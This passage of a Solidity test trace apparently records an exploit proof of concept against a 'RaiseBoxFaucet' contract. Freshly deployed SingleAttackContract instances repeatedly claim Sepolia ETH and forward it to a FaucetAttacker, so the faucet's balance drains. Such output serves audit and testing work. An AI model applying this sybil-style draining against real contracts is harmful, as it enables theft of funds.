    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 740000000000000000 [7.4e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0xDE49d1c411820e2D91AC5C26eE65b8e751320990
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 52) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [10209935] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [10209176] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [10173008] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [10165350] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 735000000000000000 [7.35e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0xd24af780838AB1CfE9E6eFdD0420022F43A58096
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 53) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [9907966] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [9907207] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [9871039] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [9863381] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 730000000000000000 [7.3e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0xC701bB9eeba7De4B9E5145edED660f3166278Ddb
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 54) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [9605997] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [9605238] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [9569070] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [9561412] FaucetAttacker::receive{value: 5000000000000000}()
